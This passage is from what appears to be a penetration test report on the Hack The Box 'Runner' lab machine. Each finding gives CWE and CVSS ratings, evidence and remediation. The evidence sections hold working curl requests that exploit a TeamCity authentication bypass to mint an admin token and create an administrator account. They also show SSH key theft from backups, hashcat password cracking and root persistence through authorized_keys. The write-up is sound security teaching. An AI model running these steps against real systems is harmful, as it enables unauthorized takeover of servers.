root@d25dc34e08e3:/mnt/root/.ssh# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnFEp0WNKI0IlkLRvHZA8YRJk6QzI9eVa069Y13HooUZTdB3otdQ4p0Ybc94bCBPCMY4u2ugEsjWTjSc0sNxWT3KEBjEZ9c9+iVVLoL3368K0QpHjpue66BW2o4OgrvpOlM6QACN1efPT+30NM2XdQkTydB+ST+Jwzd26+j+qSqFiDCUIxsLqXdmJS8ut1Sxi9GQ5RZ9o/I4tUZ1kveLNWDpTcy7lk2mmCbk6oAd0Q3XmoOxVizsaSk1jm1++bkO9TWJfZm30wVMObjoAw/K3IYI+nCbZ87chEBZo64ulajFC+3P3VGQ4GMldiQg4x1lc2af3uIffQIhg3bWHyzATwG8hqPLjBqHEfw1y37MufiqKRulyeyTOqDxGI0Y9cSkL+H72W9rylEgiJIpW4nc/WXoxHR76wml9cd5bnjW1cB8q7coOBu7G0KtJXYgIb59jfZE+GWi2nigxaDgo5i/bqDhIcV/jtNCFIlvDzw8shl5LHqjUF/Mmtu3bx71Q/+ik= root@runner' >> authorized_keys
```

 The tester then proceeded to connect to the `runner` host as the `root` user, effectively fully compromising the entire host.
 ```console?prompt=$,#
└─$ ssh root@10.129.230.247 -i root.id.rsa
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

<SNIP>

Last login: Sat Aug 31 08:33:34 2024 from 10.10.14.44
root@runner:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## 2. Unpatched Web Service Allowing Unauthorized Administrator Access

| CWE                               | [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CVSS 3.1 Score                    | [9.0](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:H/E:H/RL:O/RC:C&version=3.1)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| Description (Incl. Root<br>Cause) | The TeamCity web service was found to be using an out-dated version(`2023.05.3`) with a known authentication-bypass vulnerability that allows for an attacker to obtain the Administrator session token. This can be leveraged to create a new Administrator account and achieve RCE(Remote Code Execution) through the `/app/rest/debug/processes` endpoint with the `exePath=CMD` URL parameter.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| Security Impact                   | An attacker can use this vulnerability to create a new account with full Administrator privileges on the TeamCity web application. This access can allow an attacker to view and create new CI/CD projects, potentially compromising secret material by directly viewing source code or sensitive information left in the build logs. An attacker can use this access to create new accounts, delete previous(Non-Administrator) accounts, start/download full service backups, or gather additional information from the service that enables lateral movement.<br><br>Further, chained with another known [public exploit](https://github.com/Zyad-Elsayed/CVE-2023-42793/blob/main/rce.py), the attacker can leverage the newly created Administrator account to enable `debug` mode. This allows an attacker to achieve RCE(Remote Code Execution) on the underlying host system through the `/app/rest/debug/processes` API endpoint, giving shell-level access to the machine as the user running the `TeamCity` service. |
| Affected Domain                   | (TCP/80) http://teamcity.runner.htb                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| Remediation                       | Immediately update the `TeamCity` web-application. While anything <= version `2023.05.3` is affected by this particular vulnerability, it is important to note that multiple [succeeding versions](https://www.cvedetails.com/vulnerability-list/vendor_id-15146/product_id-30795/Jetbrains-Teamcity.html) contain similar CRITICAL vulnerabilities, thus its recommended to update to the latest `TeamCity`.<br><br>If this is not possible for business or other operational reasons, it is recommended to harden access to the system, this can be done by ensuring its not exposed to the internet and other protections such as firewalls with a white-list are set up in-front of the service.                                                                                                                                                                                                                                                                                                                            |
| External References               | https://attack.mitre.org/techniques/T1190/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |

Finding Evidence:

The following known authentication-bypass public [exploit](https://www.exploit-db.com/exploits/51884) for TeamCity `2023.05.3` was used. This exploit takes advantage of a vulnerability in the TeamCity API, allowing any one that can reach the TeamCity service to request a session token for any user, including the Administrator. 
```console?prompt=$
└─$ curl -X POST "http://teamcity.runner.htb/app/rest/users/id:1/tokens/RPC2"
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><token name="RPC2" creationTime="2024-08-31T06:39:31.303Z" value="eyJ0eXAiOiAiVENWMiJ9.SkpjdU5QNlpVc0FoOUJxNDc4QlpSOTBlSHdR.ZmE3YjU3NTYtZTc3MC00YWI0LTk0MzctMjI3ZDA1YjE4Mzkx"/>
```

After retrieving the token, the tester sends another request to the `/app/rest/users` API endpoint to create a new user account with the `SYSTEM_ADMIN` role.
```console?prompt=$
└─$ curl --path-as-is -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.SkpjdU5QNlpVc0FoOUJxNDc4QlpSOTBlSHdR.ZmE3YjU3NTYtZTc3MC00YWI0LTk0MzctMjI3ZDA1YjE4Mzkx" -X POST http://teamcity.runner.htb/app/rest/users -H "Content-Type: application/json" --data '{"username": "city_admin_temp_tester000", "password": "th3...<REDACTED>...!22", "email": "tester@tester.testing.local", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}'


<?xml version="1.0" encoding="UTF-8" standalone="yes"?><user username="city_admin_temp_tester000" id="12" email="tester@tester.testing.local" href="/app/rest/users/id:12"><properties count="3" href="/app/rest/users/id:12/properties"><property name="addTriggeredBuildToFavorites" value="true"/><property name="plugin:vcs:anyVcs:anyVcsRoot" value="city_admin_temp_tester000"/><property name="teamcity.server.buildNumber" value="129390"/></properties><roles><role roleId="SYSTEM_ADMIN" scope="g" href="/app/rest/users/id:12/roles/SYSTEM_ADMIN/g"/></roles><groups count="1"><group key="ALL_USERS_GROUP" name="All Users" href="/app/rest/userGroups/key:ALL_USERS_GROUP" description="Contains all TeamCity users"/></groups></user>
```

The newly created account was used to log into the TeamCity web application as an Administrator
![TeamCity Admin Login](/assets/images/TeamCity_Auth.png)



## 3. Sensitive Information Exposed in Backups

| CWE                               | [CWE-522: Insufficiently Protected Credentials](https://cwe.mitre.org/data/definitions/522.html)                                                                                                                                                                                                                                                                                                                                                 |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| CVSS 3.1 Score                    | [7.2](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H&version=3.1)                                                                                                                                                                                                                                                                                                                               |
| Description (Incl. Root<br>Cause) | The tester discovered a SSH private key stored in TeamCity backups within a projects `plugin` directory. SSH private keys are sensitive and pose significant security risks, as they allow for shell-level access to the host machine as the user the key belongs to.                                                                                                                                                                            |
| Security Impact                   | An attacker who can potentially gain access to the TeamCity backup files and uncover the SSH private key within will have full SSH access to the underlying machine as the user associated to the key. This can lead to un-authorized access to the machine, allowing the attacker to extract sensitive information, modify files or services accessible to the user, and use the machine as a pivot point to move laterally within the network. |
| Affected Domain                   | (TCP/22) runner.htb                                                                                                                                                                                                                                                                                                                                                                                                                              |
| Remediation                       | Ensure no sensitive information is available in backups.                                                                                                                                                                                                                                                                                                                                                                                         |
| External References               | https://attack.mitre.org/techniques/T1552/                                                                                                                                                                                                                                                                                                                                                                                                       |

Chained with CVE(using a public [exploit](https://www.exploit-db.com/exploits/51884)) to gain un-authorized access to the TeamCity administrator dashboard, a backup of the TeamCity database, server settings, build logs, and personal build changes can be requested and downloaded directly from the web dashboard using the `http://teamcity.runner.htb/admin/admin.html?item=backup` endpoint.

![TeamCity Backup Download](/assets/images/TeamCity_Backup_Download.png)

Within `/config/projects/AllProjects/pluginData/ssh_keys/` in the archive, a `id_rsa` SSH private key is discovered.
![TeamCity Backup SSH-Key](/assets/images/TeamCity-Backup-SSH.png)

A `users` file can also be located within the .zip archive under `/database_dump` revealing the TeamCity users and their sign-up information. With this knowledge, the owner of the SSH private key can trivially be discovered with trial-and-error. This led to the discovery that the SSH private key is associated with the `john` user, allowing full SSH access to the `runner` host as that user.
```console?prompt=$
└─$ ssh john@10.129.230.247 -i id_rsa   
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

<SNIP>

john@runner:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)
```


## 4. Password Re-use across different services

| CWE                               | [CWE-521: Weak Password Requirements](https://cwe.mitre.org/data/definitions/521.html)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| --------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CVSS 3.1 Score                    | [7.2](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H&version=3.1)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| Description (Incl. Root<br>Cause) | The tester discovered a re-used password across two separate web services(TeamCity and Portainer.IO), with one being a high privilege account on a service(Portainer) that allows for privilege escalation on the host machine.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| Security Impact                   | An attacker who gain access to user credentials on the first service(TeamCity) can potentially use the credentials to authenticate with the second service(Portainer.IO). With access to the Portainer.IO web portal as a privileged user, an attacker could create a new docker container with a bind mount to the host system, allowing full access to any files on the host machine. Additionally, an attacker can attach to the docker container via a `bash` shell through the web dashboard, giving quick access to anything on the host system without needing initial shell-level access to the machine. With full access to the host file-system, an attacker can potentially add/remove files, modify services, and extract sensitive data, compromising integrity, confidentiality, and availability.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| Affected Domain                   | (TCP/80) teamcity.runner.htb<br>(TCP/80) portainer-administration.runner.htb                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| Remediation                       | Passwords should never be re-used across different services unless facilitated through a SSO(Single Sign On) service with strong credential and additional factor authentication.<br><br>It is recommended to change the password to a long(16+ character), strong password with requirements set for numerical and special characters, ideally facilitated through a password manager than can generate/store strong random passwords with a substantially secure master password.<br><br>In the longer term, exploring SSO options within the used services, such as [OAuth with Portainer](https://docs.portainer.io/admin/settings/authentication/oauth), is recommended. This allows users company wide to access services they are authorized to use, while allowing them to use a secure account across the services. This can reduce complexity in administration of services by allowing limitations to be set on sign-in location, devices, and sign-in frequency. Further, this allows for setting policies that require MFA organization-wide without modifying service configurations, enables better tracking of sign-in attempts, and also removes users passwords(or hashes) from being stored within the services database avoiding further credentials from leaking in case of a service-wide compromise. |
| External References               | https://attack.mitre.org/mitigations/M1027/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |

After discovering the `portainer-administration.runner.htb` vHost, it was added to the testers `/etc/hosts` file and navigated to via a web-browser. 
![Portainer.io Login Page](/assets/images/portainerio-login.png)

This revealed the portainer.io service. The tester used the previously cracked credentials for the `matthew` account to successfully log in.
![Portainer.io Auth'd](/assets/images/Portainer_Authd.png)


## 5. Weak, Common User Credentials

| CWE                               | [CWE-521: Weak Password Requirements](https://cwe.mitre.org/data/definitions/521.html)                                                                                                                                                                                                                                                                                                                                                                                                  |
| --------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CVSS 3.1 Score                    | [6.5](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N&version=3.1)                                                                                                                                                                                                                                                                                                                                                                      |
| Description (Incl. Root<br>Cause) | It was found that a user is using a weak, common password for authentication to the TeamCity dashboard. Weak credentials are those with low password-complexity and can be easily guessed(via "password-cracking"). Common credentials tend to be weak in-nature, but include credentials found in widely available public "wordlists" or "dictionaries", these are passwords from previously breached systems that are compiled together in a list.                                    |
| Security Impact                   | An attacker who can gain un-authorized access to a users hash, such as taking advantage of another vulnerability that allows them to backup or 'dump' a services database, can potentially uncover the users clear-text password via offline password cracking. This can lead to access to the service associated with the hash, potentially leaking sensitive information, allowing modification of the service, or used as a "foothold" to move deeper within the system and network. |
| Affected Domain                   | (TCP/80) teamcity.runner.htb                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| Remediation                       | Set a internal password policy that requires strong passwords company-wide. These should impose a minimum character-limit, ideally 16+ with numerical and special character requirements.<br><br>Consider using a organization-wide password manager, protected with a strong master password, that generates random passwords for each user with accordance to the company password policy.                                                                                            |
| External References               | https://attack.mitre.org/techniques/T1110/002/                                                                                                                                                                                                                                                                                                                                                                                                                                          |


After retrieving the TeamCity backup via the Administration web dashboard it was enumerated to reveal a `users` file in the `/database_dump` directory. This file contained the username, email, and password hash for all registered users. Two names stick out, `John`, the admin, and `Matthew`, another user. 

```console?prompt=$
└─$ cat users
ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
1, admin, $2a$07$neV...<REDACTED>...qufye, John, john@runner.htb, 1725086505483, BCRYPT
2, matthew, $2a$07$q.m...<REDACTED>...Vo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
<SNIP>
```

The tester attempted to "crack" the passwords with the [Hashcat](https://github.com/hashcat/hashcat) tool. Using the hashcat [example-hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page, the hash type was identified as likely `bcrypt $2*$, Blowfish (Unix)`. The tester succeeded in cracking the hash for the `matthew` user, revealing the clear-text password. 
```console?prompt=$&error=<SNIP>
└─$ hashcat -m 3200 htb.runner.users.hashes Downloads/rockyou.txt 
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: Downloads/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

<SNIP>

$2a$07$q.m...<REDACTED>...Vo.Em:<REDACTED>
```











## Appendices

---
### Appendix A - Finding Severities

| Rating                 | Severity Rating Definition                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Critical<br>(9.0-10.0) | Exploiting this vulnerability can lead to catastrophic consequences, including complete organizational paralysis, severe financial loss, and irreversible damage to reputation. The risk exposure is extreme due to the potential for widespread system compromise and the high likelihood of targeted attacks by sophisticated threat actors. Existing security controls are inadequate, offering no effective mitigation against the profound impacts of exploitation. |
| High<br>(7.0-8.9)      | Exploiting this vulnerability can cause major harm, such as significant financial, legal, or reputational damage. Overall risk exposure is high, making it more likely to be targeted and exploited. Security controls are weak and protective measures are not strong enough to reduce the impact significantly.                                                                                                                                                        |
| Medium<br>(4.0-6.9)    | Exploiting this vulnerability could significantly impact system confidentiality, integrity, or availability. The threat exposure is elevated making exploitation more probable to occur. Security measures exist to prevent further damage and contain the severity of impact.                                                                                                                                                                                           |
| Low<br>(0.1-3.9)       | Exploiting this vulnerability poses minimal risk to operations and sensitive data, posing little threat to Confidentiality, Integrity and Availability. The overall exposure is minimal, making likelihood of exploitation is low. Effective security measures are in place to limit the impact and control any further damage.                                                                                                                                          |
| Info                   | No direct impact; this rating is used for informational purposes to highlight potential issues and security findings that have no impact on security or do not pose any immediate threat.                                                                                                                                                                                                                                                                                |


---

### Appendix B - Exploited Hosts

| Host       | IP             | Method                                                                                                                                     |
| ---------- | -------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| runner.htb | 10.129.230.247 | Foothold: TeamCity backup containing SSH Private Key<br>PrivEsc: Docker container through Portainer.io with bind mount to host file-system |

---

## Appendix C - Compromised Users

| User    | Domain/Scope/Location/Type/Host | Method                                                   |
| ------- | ------------------------------- | -------------------------------------------------------- |
| john    | `runner` Linux host             | SSH private key located in service backup                |
| matthew | TeamCity Non-Privileged User    | Weak credential in service backup                        |
| matthew | Portainer.io privileged user    | Password re-use across multiple services                 |
| root    | `runner` Linux host             | SSH private key readable post docker bind mount creation |

---

## Appendix D - Changes/Cleanup

| Host/Service        | Cleanup needed                                                                                                                                                              |
| ------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| teamcity.runner.htb | `city_admin_temp_tester000` TeamCity account must be removed with another Administrator account from the `http://teamcity.runner.htb/admin/admin.html?item=users` endpoint. |

Cleanup Preformed by Tester:

| Host/Service                        | Change/Cleanup needed                         |
| ----------------------------------- | --------------------------------------------- |
| portainer-administration.runner.htb | Docker volume and container deleted           |
| `runner` Linux host                 | SSH public key removed from `authorized_keys` |

---
### Appendix E - Additional References

- Hack The Box - [Penetration testing reports: A powerful template and guide](https://www.hackthebox.com/blog/penetration-testing-reports-template-and-guide)
	- For lessons in how to write a penetration test report. This resource was used for general guidance and the report is loosely based on the template provided by the HTB Blog post(Primarily section titles and overall flow of the report.)
